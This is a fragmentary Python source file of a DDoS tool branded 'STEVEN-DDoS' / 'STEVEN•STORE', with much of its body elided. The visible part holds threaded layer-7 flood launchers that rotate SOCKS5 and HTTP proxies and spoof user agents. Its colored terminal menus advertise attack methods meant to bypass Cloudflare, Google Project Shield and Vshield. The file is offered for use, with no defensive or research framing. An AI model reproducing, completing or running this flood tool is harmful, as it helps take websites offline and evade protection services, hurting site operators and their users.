...
def LaunctDESTROY(url, th, t):
    ...
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackDESTROY, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackDESTROY(url, until_datetime, scraper):
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
...
def LaunchPXHULK(url, timer):
    ...
    while time.time() < timelol:
        try:
            ...
            s.close()
#sky
def attackBOOM(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchBOOM, args=(url, timer)).start()

def LaunchBOOM(url, timer):
    socksCrawler()  
    prox = open("./socks5.txt", 'r').read().split('\n')
    proxy = random.choice(prox).strip().split(":")
    timelol = time.time() + int(timer)
    ...
    while time.time() < timelol:
        try:
            ...
            s.close()
#sky
def attackHTTPX(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchHTTPX, args=(url, timer)).start()

def LaunchHTTPX(url, timer):
    socksCrawler()  
    prox = open("./socks5.txt", 'r').read().split('\n')
    proxy = random.choice(prox).strip().split(":")
    timelol = time.time() + int(timer)
...
def LaunchSTELLAR(url, timer):
    ...
    while time.time() < timelol:
        try:
            ...
            s.close()
def attackbrowser(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=Launchbrowser, args=(url, timer)).start()

def Launchbrowser(url, timer):
    prox = open("./http.txt", 'r').read().split('\n')
    proxy = random.choice(prox).strip().split(":")
    timelol = time.time() + int(timer)
    m = random.choice(method)
    ...
    while time.time() < timelol:
        try:
            ...
            s.close()
def attackcfbypass(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=Launchcfbypass, args=(url, timer)).start()

def Launchcfbypass(url, timer):
    prox = open("./http.txt", 'r').read().split('\n')
    proxy = random.choice(prox).strip().split(":")
    timelol = time.time() + int(timer)
    m = random.choice(method)
...
def help():
    ...
    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"exit     "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Exit STEVEN-DDoS                       "+Fore.LIGHTGREEN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTGREEN_EX            +"╠═════════════════════════════════════════════════════╣\n")
    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"THANK    "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Thanks for using STEVEN•STORE🕊🪽.               "+Fore.LIGHTGREEN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"YOU♥     "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Pls Start Project DDoS :)                    "+Fore.LIGHTGREEN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"github   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" github.com/stevenpemula               "+Fore.LIGHTGREEN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTGREEN_EX            +"╚═════════════════════════════════════════════════════╝\n")
    stdout.write("\n")
##############################################################################################
def infoattack():
...
def credit():
    ...
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"Developer "+Fore.RED+": \x1b[38;2;0;255;189mSTEVEN•STORE🕊🪽\n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"UI Design "+Fore.RED+": \x1b[38;2;0;255;189mSTEVEN•STORE🕊🪽\n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"Methods/Tools "+Fore.RED+": \x1b[38;2;0;255;189mSTEVEN•STORE🕊🪽   \n")
    stdout.write("\x1b[38;2;0;236;250m════════════════════════╝\n")
    stdout.write("\n")    
##############################################################################################
def layer7():
    ...
    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"destroy  "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Destroy Attack                            "+Fore.LIGHTGREEN_EX+"║\n")
    ...
    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"browser"+Fore.LIGHTGREEN_EX+"  |"+Fore.LIGHTWHITE_EX+" Browser Google Project Shield, Vshield,   "+Fore.LIGHTGREEN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"cfbypass"+Fore.LIGHTGREEN_EX+" |"+Fore.LIGHTWHITE_EX+" CfBypass Google Project Shield, Vshield,  "+Fore.LIGHTGREEN_EX+"║\n")
    ...
    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"boom"+Fore.LIGHTGREEN_EX+"     |"+Fore.LIGHTWHITE_EX+" Proxy Boom attack                         "+Fore.LIGHTGREEN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"httpx"+Fore.LIGHTGREEN_EX+"    |"+Fore.LIGHTWHITE_EX+" Proxy HttpX attack                        "+Fore.LIGHTGREEN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTGREEN_EX            +"╚══════════════════════════════════════════════════════════╝\n") 
    stdout.write("\n")
##############################################################################################
def layer4():
...
def title():
    ...
    stdout.write("             "+Fore.LIGHTGREEN_EX            +"        ══╦═════════════════════════════════╦══\n")
    stdout.write("             "+Fore.LIGHTGREEN_EX+"╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("             "+Fore.LIGHTGREEN_EX+"║ "+Fore.LIGHTWHITE_EX   +"       WELCOME TO DDOS MENU METHOD   "+Fore.LIGHTGREEN_EX  +"               ║\n")
    stdout.write("             "+Fore.LIGHTGREEN_EX+"║ "+Fore.LIGHTWHITE_EX   +"       ADDED NEW METHOD AND BYPASS    "+Fore.LIGHTGREEN_EX  +"              ║\n")
    stdout.write("             "+Fore.LIGHTGREEN_EX+"║ "+Fore.LIGHTWHITE_EX   +"       Telegram : https://t.me/stevenstoree    "+Fore.LIGHTGREEN_EX  +"     ║\n")
...
##############################################################################################
def command():
    stdout.write(Fore.LIGHTGREEN_EX+"╔═══"+Fore.LIGHTGREEN_EX+"[""root"+Fore.LIGHTGREEN_EX+"@"+Fore.LIGHTGREEN_EX+"STEVEN•STORE🕊🪽"+Fore.CYAN+"]"+Fore.LIGHTGREEN_EX+"\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
    command = input()
...
def func():
    ...
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"boom     "+Fore.RED+": "+Fore.WHITE+"Proxy Boom attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"httpx     "+Fore.RED+": "+Fore.WHITE+"Proxy HttpX attack\n")
